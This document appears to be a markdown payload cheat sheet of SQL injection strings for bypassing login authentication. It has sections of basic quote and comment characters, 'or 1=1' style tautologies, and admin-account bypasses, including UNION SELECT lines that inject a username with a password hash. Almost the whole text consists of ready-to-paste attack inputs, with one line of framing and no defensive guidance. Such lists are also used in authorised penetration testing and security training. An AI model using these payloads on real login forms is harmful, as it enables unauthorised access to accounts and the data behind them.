 **Authentication Bypass Payloads**


## 🔐 Authentication Bypass Payloads (SQL Injection)

> These payloads exploit weak SQL validation during login to bypass authentication forms.

<details>
<summary> Basic Bypass</summary>

```

'-'
' '
'--'
'--' / "--"
"--"
"&"
"^"
"\*"

```

</details>

<details>
<summary> Logic-Based Payloads</summary>

```

' or 1=1 --
' or 1=1 #
' or 1=1 /\*
" or 1=1 --
" or 1=1 #
" or 1=1 /\*
'or true--
" or true--
' or true--
') or true--
") or true--
' or 'x'='x
" or "x"="x
') or ('x'='x
")) or (("x"))=(("x

```

</details>

<details>
<summary> Admin Login Bypass</summary>

```

admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/\*
admin'or 1=1 or ''='
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/\*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/\*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/\*
admin' --
admin' #
admin'/\*
admin";--
admin"; #
admin";/\*
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055

```

</details>

---
